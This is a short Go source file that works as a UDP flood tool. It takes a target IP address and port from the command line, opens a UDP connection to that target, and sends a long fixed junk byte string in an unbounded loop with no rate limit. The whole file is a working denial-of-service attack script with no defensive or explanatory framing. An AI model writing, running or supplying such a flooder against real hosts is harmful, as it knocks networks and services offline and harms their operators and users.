package main

import (
    "log"
    "net"
    "os"
)

func main() {
    if len(os.Args) != 3 {
        log.Fatalf("Usage: %s <target IP> <target port>", os.Args[0])
    }

    targetIP := os.Args[1]
    targetPort := os.Args[2]
    targetAddr := net.JoinHostPort(targetIP, targetPort)

    conn, err := net.Dial("udp", targetAddr)
    if err != nil {
        log.Fatalf("Failed to create UDP connection: %v", err)
    }
    defer conn.Close()

    log.Printf("Sending UDP packets to %s...", targetAddr)

    data := []byte("sysydoydwoydouadohqxohwdoyxwhoxohwcpuwfupdwupfwupfwupcwupfupwcupwdupdwpusupdwupdupwfupwfupqupfpwudwupdupwfpuwfpudwuodwfupwdpudwpusupdwupdupwfupfwupfwupfupwfupwfpuwfpufwupfwpufwpfupwfupfwpufapdupwdphwdpuwxphdwpuwdpuwdpuwdupwdpwufupwdpuwcpuwdpudwpufwwwoufwpudwupfwpudpwufowufuowdouwxpuwdpuwfpwdpufwpudwpufwpufwpufwpudwpdpuwdwupdupwfwoudwuodouwdouwdedoudwoydw9ydwoudwupdwpudwoudwu0ffwfu0u0fwigwu0fig0wupv0wohcwucw0ucw9yfwoydoywd9ywd9udw9udwoudowudouwdouwu0dwud0uad9ufw9uf9uwfu9wfuofwpf0wufpuwfpuwfupwfupwfupfwpufwpufwpfwpifpwipuwfpuwfpuwfpiwfi0wffwi0fwpifwpufwpifwpifpiwf0iwfpuwfpiwfpifwipfwpifwipfwpif0iwf0ifwpifw0ifwipsyooudoudoudoudoydoyd9ydoudoudoudou9yxy9d9ud9ydu9d9ydu9d9udoydyoduodoudoudukdoysoysykdkysyksotskysyisoysyosoysyosoysykdhkdykdyodyodoydodohdoydoudyodoydyodyodoydoysiysyosyidoydoydyodoyduodouduoduod9uduoduoduodouduodouduodoudyodyodyodyoduodohdyododyofuodiyduodiyduodyooudoyduodoyouduy9dyiddyoiyxoyxououdufoufoufoufoufoufuofoufouuofvuo0ufpufoudoudoudoudiysydoud8tsydohcupy9s7tw8ydojfohsyidoucjocjpcpvojcjoyoxis8tsy8w75w852725w7twiysidyds8tsy8d9udu9d8ydy8s86d9udy8s8ydoy8ys8ydiydy8f")
    for {
        _, err := conn.Write(data)
        if err != nil {
            log.Printf("Error sending packet: %v", err)
            break
        }
    }
}
